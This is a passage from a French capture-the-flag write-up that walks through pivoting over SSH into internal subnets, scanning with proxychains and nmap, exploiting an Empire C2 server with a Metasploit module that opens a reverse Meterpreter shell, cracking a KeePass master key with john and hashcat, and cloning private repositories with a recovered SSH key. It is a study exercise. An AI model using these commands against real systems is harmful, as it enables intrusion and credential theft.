</span></span><span style="display:flex;"><span>ff00::0 ip6-mcastprefix
</span></span><span style="display:flex;"><span>ff02::1 ip6-allnodes
</span></span><span style="display:flex;"><span>ff02::2 ip6-allrouters
</span></span><span style="display:flex;"><span>10.14.1.2       harvester
</span></span><span style="display:flex;"><span>192.168.51.2    harvester
</span></span><span style="display:flex;"><span>search dxlienjzncwejnldfntx3slhac.ax.internal.cloudapp.net
</span></span><span style="display:flex;"><span>nameserver 127.0.0.11
</span></span><span style="display:flex;"><span>options ndots:0
</span></span></code></pre></div><p>On a accès à <em><em>2 sous-réseaux</em></em> :</p>
<ul>
<li><strong>10.14.1.0/24</strong></li>
<li><strong>192.168.51.0/24</strong></li>
</ul>
<p>On peut donc quitter puis refaire une connexion ssh mais cette fois, on va utiliser la fonction de <a href="https://www.searchevolution.com/security/2021/07/22/pivot-avec-ssh-plink-socat-chisel-ou-sshuttle/"  target="_blank" rel="noopener" >pivoting</a> de ssh</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -D <span style="color:#bd93f9">9050</span>  -i ./id_rsa -p <span style="color:#bd93f9">45236</span> harvester@20.126.99.66
</span></span></code></pre></div><p>Depuis notre shell attaquant, on peut maintenant scanner leur réseau internet grâce à un proxy comme <a href="https://doc.ubuntu-fr.org/proxychains"  target="_blank" rel="noopener" >&lt;code&gt;Proxychains&lt;/code&gt;</a></p>
<p>Après les nmaps sur les 2 réseaux. On obtient :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.51.2
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#ff79c6">(</span>protocol 2.0<span style="color:#ff79c6">)</span> <span style="color:#6272a4">#Inconnu</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.51.3
</span></span><span style="display:flex;"><span>5432/tcp open       PostgreSQL DB 9.6.0 or later
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 192.168.51.5
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#6272a4"># GITLAB</span>
</span></span><span style="display:flex;"><span>8181/tcp open  intermapper      <span style="color:#6272a4"># Gestion de serveur = intermapper</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.14.1.1 // 192.168.51.1
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>80/tcp   open  http             <span style="color:#6272a4"># Page Phising microsoft</span>
</span></span><span style="display:flex;"><span>3000/tcp open  ppp              <span style="color:#6272a4"># Login Custom</span>
</span></span><span style="display:flex;"><span>8000/tcp open  http-alt         <span style="color:#6272a4"># phpmyadmin</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.14.1.2
</span></span><span style="display:flex;"><span>2048/tcp open  caldav  <span style="color:#6272a4"># Intéressant</span>
</span></span></code></pre></div><p>On peut en déduire le shéma réseau ci contre :</p>
<p><img src="./img/network.png" alt="AltText"></p>
<p>La dernière IP : <strong>10.14.1.2</strong> sur le port <strong>2048</strong> semble intéressante.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@localhost:/home/vozec# proxychains curl 10.14.1.2:2048
</span></span><span style="display:flex;"><span>ProxyChains-3.1 <span style="color:#ff79c6">(</span>http://proxychains.sf.net<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
</span></span><span style="display:flex;"><span>&lt;html&gt;
</span></span><span style="display:flex;"><span>  &lt;body&gt;
</span></span><span style="display:flex;"><span>    &lt;h1&gt;It works!&lt;/h1&gt;
</span></span><span style="display:flex;"><span>    &lt;p&gt;This is the default web page <span style="color:#ff79c6">for</span> this server.&lt;/p&gt;
</span></span><span style="display:flex;"><span>    &lt;p&gt;The web server software is running but no content has been added, yet.&lt;/p&gt;
</span></span><span style="display:flex;"><span>    &lt;p&gt;Flag <span style="color:#bd93f9">5</span> : ISEC<span style="color:#ff79c6">{</span>P0r7_5c4nn1g_iS_3asY<span style="color:#ff79c6">}</span>&lt;/p&gt;
</span></span><span style="display:flex;"><span>    &lt;p&gt;The EMPIRE Stikes Back !&lt;/p&gt;
</span></span><span style="display:flex;"><span>  &lt;/body&gt;
</span></span><span style="display:flex;"><span>&lt;/html&gt;
</span></span></code></pre></div><p>HOP le flag !</p>
<hr>
<h2 id="stop-the-agents">Stop the agents</h2>
<ul>
<li><strong>Nom</strong>  : Stop the agents</li>
<li><strong>Point</strong> : 30</li>
<li><strong>Description</strong> :
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>As you can see, security does not seem to be a priority <span style="color:#ff79c6">for</span> them. It is unlikely that their C2 is really up to date. Find a vulnerability or vulnerabilities on it and bring back root access.
</span></span><span style="display:flex;"><span>Finish the work !
</span></span></code></pre></div></li>
</ul>
<h6 id="solution--6">Solution :</h6>
<p>Après plusieurs heures de recherches. J&rsquo;ai trouvé <a href="https://www.tenable.com/blog/identifying-empire-http-listeners"  target="_blank" rel="noopener" >cet article</a> ainsi que <a href="https://support.alertlogic.com/hc/en-us/articles/360004032471-PowerShell-Empire-Post-Exploitation-Framework-HTTP-based-C2-Communications"  target="_blank" rel="noopener" >cette documentation</a>.</p>
<p>On remarque que le nmap nous renvoie un <strong>http-server-header</strong> égale à <strong>Microsoft-IIS/7.5</strong> comme mentionné dans l&rsquo;article.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Nmap scan report <span style="color:#ff79c6">for</span> 10.14.1.3
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>2048/tcp open  caldav  Radicale calendar and contacts server <span style="color:#ff79c6">(</span>Python BaseHTTPServer<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.5
</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title.
</span></span><span style="display:flex;"><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#bd93f9">1</span> open and <span style="color:#bd93f9">1</span> closed port
</span></span><span style="display:flex;"><span>Device type: WAP|phone
</span></span><span style="display:flex;"><span>Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
</span></span><span style="display:flex;"><span>OS details: Tomato 1.28 <span style="color:#ff79c6">(</span>Linux 2.4.20<span style="color:#ff79c6">)</span>, Tomato firmware <span style="color:#ff79c6">(</span>Linux 2.6.22<span style="color:#ff79c6">)</span>, Sony Ericsson U8i Vivaz mobile phone
</span></span></code></pre></div><p>De plus, ce texte est le texte par défaut d&rsquo;un <a href="https://www.wikiwand.com/fr/Command_and_Control"  target="_blank" rel="noopener" >&lt;strong&gt;C2&lt;/strong&gt;</a> nommé <a href="https://github.com/BC-SECURITY/Empire"  target="_blank" rel="noopener" >&lt;strong&gt;Empire&lt;/strong&gt;</a> et il ressemble énormément à celui qu&rsquo;on à trouvé au challenge précédent .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#ff79c6">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#ff79c6">body</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">h1</span>&gt;It works!&lt;/<span style="color:#ff79c6">h1</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">p</span>&gt;This is the default web page for this server.&lt;/<span style="color:#ff79c6">p</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#ff79c6">p</span>&gt;The web server software is running but no content has been added, yet.&lt;/<span style="color:#ff79c6">p</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#ff79c6">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#ff79c6">html</span>&gt;
</span></span></code></pre></div><p>La description nous parle d&rsquo;une vieille version de ce <strong>C2</strong> qui n&rsquo;est pas à jour.
Si on regarde de plus prêt, on trouve un <code>exploit</code> sur <a href="https://www.metasploit.com/"  target="_blank" rel="noopener" >&lt;code&gt;metasploit&lt;/code&gt;</a> qui permet d&rsquo;obtenir un shell :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains msfconsole -q
</span></span><span style="display:flex;"><span>use exploit/linux/http/empire_skywalker
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">set</span> RHOSTS 10.14.1.3
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">set</span> RPORT <span style="color:#bd93f9">2048</span>
</span></span><span style="display:flex;"><span>exploit
</span></span></code></pre></div><p>Résultats :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#ff79c6">(</span>linux/http/empire_skywalker<span style="color:#ff79c6">)</span> &gt; exploit
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Started reverse TCP handler on 194.233.164.121:4444
</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Successfully negotiated an artificial Empire agent
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Writing payload to /tmp/dwxCKALX
</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Writing cron job to /etc/cron.d/DVRDDTYW
</span></span><span style="display:flex;"><span>|S-chain|-&lt;&gt;-127.0.0.1:9050-&lt;&gt;&lt;&gt;-10.14.1.2:2048-&lt;&gt;&lt;&gt;-OK
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Waiting <span style="color:#ff79c6">for</span> cron job to run, can take up to <span style="color:#bd93f9">60</span> seconds
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Sending stage <span style="color:#ff79c6">(</span><span style="color:#bd93f9">40132</span> bytes<span style="color:#ff79c6">)</span> to 20.126.99.66
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted /etc/cron.d/DVRDDTYW
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted /tmp/dwxCKALX
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Deleted /agent.log
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Meterpreter session <span style="color:#bd93f9">1</span> opened <span style="color:#ff79c6">(</span>XXX.XXX.XXX.XXX:4444 -&gt; 20.126.99.66:57266<span style="color:#ff79c6">)</span> at 2022-06-30 14:49:02 +0000
</span></span></code></pre></div><p>On peut lire le flag !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>meterpreter &gt; ls
</span></span><span style="display:flex;"><span>Listing: /root
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">==============</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Mode              Size  Type  Last modified              Name
</span></span><span style="display:flex;"><span>----              ----  ----  -------------              ----
</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#bd93f9">0</span>     fil   2022-06-30 14:45:01 +0000  .bash_history
</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#bd93f9">570</span>   fil   2010-01-31 11:52:26 +0000  .bashrc
</span></span><span style="display:flex;"><span>040700/rwx------  <span style="color:#bd93f9">4096</span>  dir   2022-06-30 08:43:29 +0000  .cache
</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#bd93f9">148</span>   fil   2015-08-17 15:30:33 +0000  .profile
</span></span><span style="display:flex;"><span>040700/rwx------  <span style="color:#bd93f9">4096</span>  dir   2022-06-30 08:43:52 +0000  .ssh
</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#bd93f9">209</span>   fil   2022-06-30 08:43:54 +0000  .wget-hsts
</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#bd93f9">151</span>   fil   2022-06-23 11:36:09 +0000  TODO.md
</span></span><span style="display:flex;"><span>100644/rw-r--r--  <span style="color:#bd93f9">100</span>   fil   2022-06-23 11:36:08 +0000  flag6.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; cat flag6.txt
</span></span><span style="display:flex;"><span>Flag-6 : ISEC<span style="color:#ff79c6">{</span>UnRE5trI<span style="color:#ff79c6">(</span>Ted_Up1oAd_of_F11e<span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Finish the job and bring back the name of these thugs !
</span></span></code></pre></div><hr>
<h1 id="secondary-objectives-4-challenges">SECONDARY OBJECTIVES <em>(4 Challenges)</em></h1>
<h2 id="backup-key">Backup key</h2>
<ul>
<li><strong>Nom</strong>  : Bad place</li>
<li><strong>Point</strong> : 30</li>
<li><strong>Description</strong> : Keep digging on their C2, they must have hidden secrets that we need to know.</li>
</ul>
<h6 id="solution--7">Solution :</h6>
<p>Sur la machine précédente, celle en <strong>10.14.1.3</strong> qui contient le C&amp;C <code>Empire</code>, on trouve :</p>
<ul>
<li><strong>TODO.md</strong></li>
<li><strong>/opt/backup.kdbx</strong></li>
</ul>
<p>On va les télécharger via la commande <code>download</code> de <strong>meterpreter</strong> , on en aura besoin plus tard !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>download TODO.md
</span></span><span style="display:flex;"><span>download /opt/backup.kdbx
</span></span></code></pre></div><p>Cette partie devient de la Forensic. On a un fichier en <code>.kdbx</code> et les fans de CTF auront reconnu un <code>fichier de mot passe Keepass</code></p>
<p>Pour déchiffrer ce fichier et accéder à son contenu, on doit cracker la <code>MasterKey</code>.
On utlise <a href="https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc"  target="_blank" rel="noopener" >&lt;strong&gt;keepass2john&lt;/strong&gt;</a> pour obtenir un hash compatible avec <a href="https://github.com/openwall/john"  target="_blank" rel="noopener" >&lt;strong&gt;JohnTheRipper&lt;/strong&gt;</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>keepass2john backup.kdbx &gt; hash_masterkey.txt
</span></span></code></pre></div><p>J&rsquo;ai d&rsquo;abord essayé de cracker le mot de passe avec <a href="https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz"  target="_blank" rel="noopener" >&lt;strong&gt;rockyou.txt&lt;/strong&gt;</a> mais le mot de passe n&rsquo;a pas était trouvé &hellip;</p>
<p>Donc j&rsquo;ai directement utilisé <strong>HashCat</strong> avec une rule et des mots-clés des challenges précédents pour générer une wordlist : <a href="https://github.com/NotSoSecure/password_cracking_rules"  target="_blank" rel="noopener" >OneRuleToRuleThemAll.rule</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat --force list.txt -r ./OneRuleToRuleThemAll.rule --stdout | sort -u &gt; list-uniq.txt
</span></span></code></pre></div><p>Puis j&rsquo;ai cracké le hash :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --format<span style="color:#ff79c6">=</span>KeePass h --wordlist<span style="color:#ff79c6">=</span>/tmp/list-uniq.txt
</span></span><span style="display:flex;"><span>Loaded <span style="color:#bd93f9">1</span> password <span style="color:#8be9fd;font-style:italic">hash</span> <span style="color:#ff79c6">(</span>KeePass <span style="color:#ff79c6">[</span>SHA256 AES 32/64<span style="color:#ff79c6">])</span>
</span></span><span style="display:flex;"><span>Cost <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">(</span>iteration count<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">60000</span> <span style="color:#ff79c6">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Cost <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">(</span>version<span style="color:#ff79c6">)</span> is <span style="color:#bd93f9">2</span> <span style="color:#ff79c6">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Cost <span style="color:#bd93f9">3</span> <span style="color:#ff79c6">(</span>algorithm <span style="color:#ff79c6">[</span><span style="color:#8be9fd;font-style:italic">0</span><span style="color:#ff79c6">=</span>AES, <span style="color:#8be9fd;font-style:italic">1</span><span style="color:#ff79c6">=</span>TwoFish, <span style="color:#8be9fd;font-style:italic">2</span><span style="color:#ff79c6">=</span>ChaCha<span style="color:#ff79c6">])</span> is <span style="color:#bd93f9">0</span> <span style="color:#ff79c6">for</span> all loaded hashes
</span></span><span style="display:flex;"><span>Will run <span style="color:#bd93f9">16</span> OpenMP threads
</span></span><span style="display:flex;"><span>Press <span style="color:#f1fa8c">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#ff79c6">for</span> status
</span></span><span style="display:flex;"><span>0g 0:00:00:49 6,08% <span style="color:#ff79c6">(</span>ETA: 22:08:04<span style="color:#ff79c6">)</span> 0g/s 866.5p/s 866.5c/s 866.5C/s almendrapassword123..alohaphising
</span></span><span style="display:flex;"><span>0g 0:00:03:47 35,41% <span style="color:#ff79c6">(</span>ETA: 22:05:20<span style="color:#ff79c6">)</span> 0g/s 983.7p/s 983.7c/s 983.7C/s jbu876a..jbu9ra6
</span></span><span style="display:flex;"><span>operator1234     <span style="color:#ff79c6">(</span>backup<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>1g 0:00:05:57 DONE <span style="color:#ff79c6">(</span>2022-06-28 22:00<span style="color:#ff79c6">)</span> 0.002800g/s 955.6p/s 955.6c/s 955.6C/s op-erator1234..operator1234!!!
</span></span><span style="display:flex;"><span>Use the <span style="color:#f1fa8c">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
</span></span><span style="display:flex;"><span>Session completed
</span></span></code></pre></div><p><strong>operator1234</strong> &hellip;
Super, un mot de passe connu que j&rsquo;avais déjà AHAHA. J&rsquo;aurais dû tester les anciens mots de passe avant !</p>
<p>Maintenant, quand j&rsquo;ouvre le KeePass, j&rsquo;ai :</p>
<p><img src="./img/keypass1.png" alt="AltText"></p>
<p>et dans une autre section</p>
<p><img src="./img/keypass2.png" alt="AltText"></p>
<p>On fait <strong>&lsquo;Click Droit&rsquo;</strong> &gt; <strong>&lsquo;Copier le mot de passe&rsquo;</strong> et HOP : <code>ISEC{N0tG00dH1d1ngPl4C3}</code></p>
<hr>
<h2 id="final-takedown">Final takedown</h2>
<ul>
<li><strong>Nom</strong>  : Final takedown</li>
<li><strong>Point</strong> : 30</li>
<li><strong>Description</strong> :
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>It seems that not all their projects are in-house. See what you can <span style="color:#ff79c6">do</span> with it. Don&#39;t forget that we need to find their identities. Bring back at least one email.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Flag format : &lt;firstname&gt;&lt;lastname&gt;@&lt;maill&gt;.fr
</span></span></code></pre></div></li>
</ul>
<h6 id="solution-1">Solution:</h6>
<p>On cherche ici un mail . Au challenge précédent , on a récupéré un nom d&rsquo;utilisateur <strong>Gitlab</strong>/<strong>Github</strong> ainsi que <strong>a clé SSH privée</strong> .
Enfin, dans le fichier <strong>TODO.txt</strong> téléchargé depuis le server <strong>EMPIRE</strong> , on lit :</p>
<pre tabindex="0"><code># TODO

- Clean history
- Call operator98 for debug
- Move to private public github repo :
  - ransomware
  - GonnaCry
  - CrackMapExec
  - backdoor_py
</code></pre><p>Parfait ! On a :</p>
<ul>
<li><code>Un Username GITLAB</code></li>
<li><code>Sa Clé SSH Privée</code></li>
<li><code>Le Nom des Répository</code></li>
</ul>
<p>On peut donc <strong>cloner</strong> ses répos privés :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>~/.ssh<span style="color:#ff79c6">]</span>$ ssh -T git@github.com
</span></span><span style="display:flex;"><span>Hi apt54! You<span style="color:#f1fa8c">&#39;ve successfully authenticated, but GitHub does not provide shell access.
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">[~/.ssh]$ GIT_SSH_COMMAND=&#39;</span>ssh -i /root/.ssh/id_rsa -o <span style="color:#8be9fd;font-style:italic">IdentitiesOnly</span><span style="color:#ff79c6">=</span>yes<span style="color:#f1fa8c">&#39; git clone git@github.com:apt54/backdoor_py.git
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">Cloning into &#39;</span>backdoor_py&#39;...
</span></span><span style="display:flex;"><span>remote: Enumerating objects: 20, <span style="color:#ff79c6">done</span>.
</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#ff79c6">(</span>20/20<span style="color:#ff79c6">)</span>, <span style="color:#ff79c6">done</span>.
</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#ff79c6">(</span>13/13<span style="color:#ff79c6">)</span>, <span style="color:#ff79c6">done</span>.
</span></span><span style="display:flex;"><span>remote: Total <span style="color:#bd93f9">20</span> <span style="color:#ff79c6">(</span>delta 6<span style="color:#ff79c6">)</span>, reused <span style="color:#bd93f9">20</span> <span style="color:#ff79c6">(</span>delta 6<span style="color:#ff79c6">)</span>, pack-reused <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#ff79c6">(</span>20/20<span style="color:#ff79c6">)</span>, 74.96 KiB | 446.00 KiB/s, <span style="color:#ff79c6">done</span>.
</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#ff79c6">(</span>6/6<span style="color:#ff79c6">)</span>, <span style="color:#ff79c6">done</span>.
</span></span></code></pre></div><p>Maintenant , on va utiliser <code>GIT GUI</code> sur Windows pour explorer le <code>.git</code>
Dans les commits, on trouve :</p>
<p><img src="./img/commit.png" alt="AltText"></p>
<p>Flag : <code>jordan.alisto@outlook.fr</code></p>
<hr>
<h2 id="backup-key-1">Backup key</h2>
<ul>
<li><strong>Nom</strong>  : Backup key</li>
<li><strong>Point</strong> : 40</li>
<li><strong>Description</strong> :
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>During a previous operation we recovered elements related to their backup system. Unfortunately, we did not succeed in decrypting them. Find us the key, it must be somewhere!
</span></span></code></pre></div></li>
</ul>
<h6 id="solution-2">Solution:</h6>
<p>On peut se reconnecter sur le premier ssh auquel on a eu accés .</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/$ ls
</span></span><span style="display:flex;"><span>backups  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
</span></span><span style="display:flex;"><span>harvester@harvester:/$ ls /backups/
</span></span><span style="display:flex;"><span>backup-log-1.log.zip  backup-log-2.log.zip  backup-log-3.log.zip  backup.sh  password.enc
</span></span></code></pre></div><p>On trouve un dossier <code>backups</code>
De plus dans <code>opt</code> , on retrouve un dossier similaire</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/opt$ ls
</span></span><span style="display:flex;"><span>backups
</span></span><span style="display:flex;"><span>harvester@harvester:/opt$ ls backups/
</span></span><span style="display:flex;"><span>backup.pub  test-backup.sh  test.txt  test.txt.enc
</span></span><span style="display:flex;"><span>harvester@harvester:/opt$
</span></span></code></pre></div><p>Voici le script de chiffrement, il utilise openssl</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>harvester@harvester:/opt/backups$ cat test-backup.sh
</span></span><span style="display:flex;"><span><span style="color:#6272a4">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#ff79c6">[</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#8be9fd;font-style:italic">$#</span><span style="color:#f1fa8c">&#34;</span> -ne <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">]</span>; <span style="color:#ff79c6">then</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;[-] Error. Usage : ./test-backup.sh &lt;file-to-backup&gt;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>    cat <span style="color:#8be9fd;font-style:italic">$1</span> | openssl rsautl -encrypt -pubin -inkey backup.pub | base64 | tr -d <span style="color:#f1fa8c">&#39;\n&#39;</span> &gt; <span style="color:#8be9fd;font-style:italic">$1</span>.enc
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">fi</span>
</span></span></code></pre></div><p>On nous fournit aussi une clée Publique :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-----BEGIN PUBLIC KEY-----
</span></span><span style="display:flex;"><span>MHwwDQYJKoZIhvcNAQEBBQADawAwaAJhAMrZhFV8l+A5Qxoiatcn8MbUPvPUGEaf
</span></span><span style="display:flex;"><span>GzdQSbIphD7p+Dsfl3OKwnT19h9AHyHxkT5LZLsxtVo405jA3+0AsTkvCIlxHESz
</span></span><span style="display:flex;"><span>WeeXbGF/zHNPBuPpXCZHYJG1L0YueUE9tQIDAQAB
</span></span><span style="display:flex;"><span>-----END PUBLIC KEY-----
</span></span></code></pre></div><p>C&rsquo;est ici un challenge de crypto basique .
On doit casser la clé publique pour ainsi reconstruire la clé privée et donc décoder le fichier <strong>.enc</strong></p>
<p>Pour résoudre ce challenge, il faut les Connaissances basiques du <a href="https://fr.wikipedia.org/wiki/Chiffrement_RSA"  target="_blank" rel="noopener" >chiffrement RSA</a></p>
<p>On récupère le module N:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@DESKTOP-HNQJECB: /root/Desktop
